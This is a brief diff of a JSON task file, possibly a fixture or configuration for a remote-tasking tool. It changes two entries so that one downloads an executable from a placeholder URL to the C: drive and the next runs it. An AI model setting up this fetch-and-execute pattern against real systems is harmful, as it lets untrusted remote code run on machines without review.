@@ -1,12 +1,13 @@
 {
- "00000001": 
+"00000001": 
     {
-    "type": "exec", 
-     "payload": "notepad"
+     "type": "load", 
+     "url": "http://example.com/notepad.exe",
+     "dest": "c:\notepad.exe"
     },
- "00000002": 
+"00000002": 
     {
-    "type": "exec", 
-     "payload": "powershell"
+     "type": "exec", 
+     "payload": "c:\notepad.exe"
     }
 }
